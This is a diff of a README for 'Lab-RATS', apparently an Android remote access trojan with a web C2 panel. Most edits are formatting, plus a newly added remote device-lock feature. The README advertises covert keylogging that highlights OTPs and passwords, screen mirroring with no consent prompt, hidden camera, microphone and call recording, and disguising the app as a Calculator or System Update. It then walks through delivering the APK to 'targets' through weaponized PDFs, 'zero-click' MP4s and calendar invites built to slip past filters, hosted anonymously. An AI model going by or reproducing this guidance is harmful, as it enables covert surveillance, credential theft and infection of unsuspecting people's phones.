@@ -30,7 +30,7 @@
     -   **Web Hardening**: Assets (JS/CSS) are **minified and obfuscated**; featuring **anti-debugging loops** and **interaction locks** (Right-Click, F12) to prevent unauthorized analysis.
     -   **Dynamic Code Obfuscation**: Build-time **randomization** of **logic flow and class names** via ProGuard/R8 integration.
     -   **Encrypted Local Telemetry**: Internal **system logs are encrypted at build-time**, rendering them **unreadable to standard mobile forensic tools**.
--   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. **Instantly transform Lab-RATS** into a **Calculator**, **Weather App**, **System Update**, or **Google Play Protect**.
+-   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the **"Masquerade Library"** of **convincing clones**. **Instantly transform Lab-RATS** into a **Calculator**, **Weather App**, **System Update**, or **Google Play Settings**.
 -   🩹 **Self-Healing Protocol**: Automatically detects and **repairs damaged service bindings** or **revoked permissions** in the background.
 -   ☎️ **Emergency Recovery Hub**:
      -   **Icon Restore**: If the **launcher icon is in Stealth Mode**, **dial `*#1337#` on the devices dialpad** to **instantly** restore the **Lab-RATS dashboard**.
@@ -46,7 +46,8 @@
     -   **Ghost Screen Control/Mirror**: **Cast & control the live screen remotely** with **NO "Consent Prompt" required**.
     -   **Blackout Mode**: A **high-stealth mode** designed to **physically mask the targets device display** while maintaining a **non-masked live remote feed**.
     -   **NEW! Ghost Toast Protocol**: Dispatch **tactical, persistent overlays**. Supports **Custom Colors, Animations (Pop, Static, Scroll)**, and **Chaotic "Burnt Toast" mode** *(multiple random spawns to overwhelm the target)*.
-    -   **Live Keylogging (v1.4 Update)**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for browser login info.
+    -   **NEW! Remote System Denial Lock**: Deploy a **persistent, full-screen security overlay** to **lock physical interaction** and **render the device inoperable until hard-reset/restarted** or **unlocked remotely from the C2 dashboard**.
+    -   **Live Keylogging**: Intercept **keystrokes** and **system text in real-time**. Now features **Sensitive Info Highlighting** *(Passcodes, OTPs, Emails glow Red)* and **Deep Extraction** for **browser login info**.
 -   🧪 **NEW!** **Exploit Factory Tab**:
     -   **NFC Proximity Vector**: Generate **binary NDEF payloads for physical tags**.
     -   **QR Visual Vector**: Dedicated **high-density QR generator** for independent URL delivery.
@@ -60,8 +61,8 @@
 -   📸 **Tactical Surveillance Hub (v1.5.1 Ultra-Stability)**
     -   **Covert Recording**: Stealthily **record video without any user-facing** activity.
     -   **Snap Photos**: Covert **image capture integrated** into the live stream.
-    -   **Nightmode V2**: Aggressive **electronic brightening** for low-light environments. Now features **Hardware Breathe Sync** and **AE Bypass** for zero-freeze operation on modern high-latency sensors.
--   🎙️ **Acoustics & Interception**: **Live microphone recording** and automated **call recording** for both **incoming and outgoing** calls.
+    -   **Nightmode V2**: Aggressive **electronic brightening** for **low-light** environments. Now features **Hardware Breathe Sync** and **AE Bypass** for zero-freeze operation on **modern high-latency sensors**.
+-   🎙️ **Acoustics & Interception**: **Live microphone recording** and **automated call recording** for both **incoming and outgoing** calls.
 -   📂 **Advanced Data Uplink**:
     -   **Integrated File Manager**: **Navigate, download**, and **manage files**. Features an instant **Search Bar** and **Category Filters**.
     -   **Info Gathering**: Access **Call Logs**, **Contacts**, **Hardware Analytics**, and **Installed Apps** remotely.
@@ -89,9 +90,9 @@
 -   **Unrestricted Tools**: Install and run **Python scripts, Nmap scans, or Metasploit** directly from the C2 web terminal.
 -   **Persistent Environment**: Full support for **Termux's internal storage** and **standard Linux binaries**.
 
-### 🖥️ **NEW!** **Enhanced Remote Shell**
+### 🖥️ **Enhanced Remote Shell**
 
-The **Built-in Shell has been overhauled** for professional workflows:
+The **Terminal Tabs Built-in Shell has been overhauled** for professional workflows:
 -   **Command History**: Navigate previous commands instantly using **Up/Down arrows**.
 -   **System Diagnostics**: New `sysinfo` command for an aggregated hardware/software overview.
 -   **Modernized Interface**: Updated to `root@Android` prompt with a built-in `help` menu.
@@ -99,7 +100,7 @@ The **Built-in Shell has been overhauled** for professional workflows:
 
 ---
 
-## 📊 Google Sheet Setup Instructions (v1.4.5)
+## 📊 **Google Sheet Setup Instructions**
 
 1.  **Create** a new **Google Sheet** for **IP Tracking**.
 2.  Go to **Extensions** → **Apps Script** and **Paste in the Hybrid Snippet below:** *(Supports both GET and POST)*
@@ -165,8 +166,8 @@ function handleRequest(e) {
 ## 🛠️ Getting Started
 
 ### 1. Requirements
-*   **Java 17 or 21** installed on your **workstation**.
-*   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus supported)*
+*   **Java 17 or 21 installed** on your **workstation**.
+*   A **Test Android** device. 📱 *(Samsung/Pixel/OnePlus/HTC supported)*
 *   Your **Google Sheet Webhook URL**. *(Previous Section)*
 
 ### 2. Building the APK (on PC)
@@ -175,31 +176,31 @@ function handleRequest(e) {
 3.  **Execute** the builder: `chmod +x build.sh && ./build.sh` (Mac/Linux) or `build.bat` (Windows).
 4.  **Select a Build Strategy**:
     *   **Option 1 (Manual)**: For basic configuration of App Name, ID, and Logo before building.
-    *   **Option 6 (Automated Wizard)**: For the full **Build → Host → Weaponize** flow.
+    *   **Option 5 (Automated Wizard)**: For the full **Build → Host → Weaponize** flow.
 5.  Enter your **Google Sheet Webhook URL** when prompted to enable remote device reporting.
-6.  Retrieve your `signed.apk` (and any weaponized payloads like PDFs or MP4s) from the `/apk-builder/output/` directory.
+6.  Retrieve your `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `/apk-builder/output/` directory.
 
 ### 3. Deploying & Installing onto Android Device
 
 **Deployment is a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
 #### **A. **NEW!** Strategic Weaponization** (The Wrapper)
-Standard `.apk` files are **often blocked by email filters and browser security**. Use the **Wizard (Option 6)** in the `apk-builder` to wrap your link inside a **high-compatibility carrier file**:
+Standard `.apk` files are **often blocked by email filters and browser security**. Use the **Wizard (Option 5)** in the `apk-builder` to wrap your link inside a **high-compatibility carrier file**:
 *   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download**, bypassing **standard PDF security filters**.
-*   **🎬 Zero-Click MP4**: Send as a **video file**. It exploits mobile **Media Heap Overflows** during gallery **indexing or thumbnail generation** to force-register the C2 link in the background.
-*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a weaponized "Security Review" link.
+*   **🎬 Zero-Click MP4**: Send as a **video file**. It exploits mobile **Media Heap Overflows** during gallery **indexing or thumbnail generation** to **force-register the C2 link in the background**.
+*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
 *   **🔳 QR Code / 📡 NFC**: Best for physical placement or **"Tap-to-Infect" proximity delivery**. Generates a high-density QR or NDEF record pointing to the hardened delivery URL.
 *   **And many more**: The wizard also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document** macros.
 
 #### **B. Hosting Strategies**
-*   **Anonymous Cloud**: Option 6 uses **Catbox.moe** by default. It is **anonymous, fast**, and **generates a direct link**.
+*   **Anonymous Cloud**: Option 5 uses **Catbox.moe** by default. It is **anonymous, fast**, and **generates a direct link**.
 *   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from another infected device using the `/download/` endpoint.
 
 #### **C. Installation & Initialization**
 Once the **Target device** downloads the APK:
 1.  **Manual Sideload**: If you have **physical access to the device**, use `adb install signed_payload.apk`.
 2.  **Permissions (Critical)**: Open the app **once**. It will **prompt for necessary permissions** *(Camera, SMS, Files, etc)*.
-    *   **Remote Permission Prompt**: If the **user skips a permission**, you can **remotely trigger the system prompt again** from the **Ghost tab** using the **REPAIR PERMISSIONS** button.
+    *   **Remote Permission Prompt**: If the **user skips a permission**, you can **remotely trigger the system prompt again** from the **Ghost Tab** using the **REPAIR PERMISSIONS** button.
 3.  **Self-Vanishing**: 5 seconds after launch, the app will automatically **replace its icon and name** with the decoy you chose during build *("System Update", "Calculator")*. The original icon you chose during the build will **disappear from the launcher**.
 4.  **Uplink Confirmation**: Check your **Google Sheet**. Within 10 seconds of initialization, the **active IPv6 address and hardware status will appear in the log**.
 
@@ -219,7 +220,7 @@ Once the **Target device** downloads the APK:
 If you find **Lab-RATS awesome** and **useful for your security research**, **please Star ⭐ the project**—it drives **further development!!**
 
 ### **Contributions**
-**Bug reports, add new feature** and **pull requests** are **always welcome**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-STAR/CONTRIBUTING.md) for more info)*
+**Bug reports, add new feature** and **pull requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-STAR/CONTRIBUTING.md) for more info)*
 
 ---
 
@@ -237,7 +238,7 @@ bc1q6lmkuju3kf7f8624fwt5qs7k5mf63mekgcnzf4
 
 ## 📸 **Screenshots/Video Clips**
 
-### Example APK build in terminal (Mac OS):
+### Example APK build in Terminal (Mac OS):
 > *This build excludes my Google Sheet Webhook URL for security. For normal private builds, you must add your own Google webhook URL to correctly receive the IPv6 address link from the app after installation.*
 
 https://github.com/user-attachments/assets/366df760-df71-455e-aae9-3acf3ef6ed26
@@ -268,7 +269,7 @@ https://github.com/user-attachments/assets/5df5613a-a639-4c80-96ac-50c7a0d015b1
 
 ---
 
-## Remote Web Control (C2) Panel - PC Interface
+## Remote Web Control (C2) Dashboard - PC Interface
 
 ### Remote C2 Panel Video:
 
@@ -300,7 +301,7 @@ https://github.com/user-attachments/assets/5d8f33c7-f4a6-4df5-ab55-69e317ca7874
 
 ---
 
-### Exploit Factory Tab: (NEW)
+### (NEW!) Exploit Factory Tab:
 
 [![05-Exploits-Tab.png](https://i.postimg.cc/4xfBF9WB/05-Exploits-Tab.png)](https://postimg.cc/rKH1DKXr)
 
